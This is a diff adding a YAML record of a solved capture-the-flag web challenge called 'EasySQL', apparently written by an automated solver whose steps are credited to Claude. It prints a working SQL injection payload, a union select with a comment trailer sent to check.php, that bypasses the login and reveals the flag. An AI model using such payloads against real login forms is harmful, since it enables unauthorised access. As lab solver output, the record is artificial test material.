@@ -1,0 +1,16 @@
+name: EasySQL
+category: web
+keywords:
+- easysql
+- sql
+steps:
+- '[claude] EasySQL: `check.php?username=admin'' union select 1,2,3-- -&password=x`
+  triggers SQLi login bypass on MariaDB and prints the flag'
+- '[claude] Flag displayed: <FLAG>'
+- '[claude] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[claude] FOUND_FLAG=<FLAG>'
+success_format: flag\{[^}]+\}
+source: 6ffcc474-3dd6-47c0-95df-7caea7b7245d (solver 76f12d26-77dd-42ab-9c74-f93db2178488)
+notes: ''
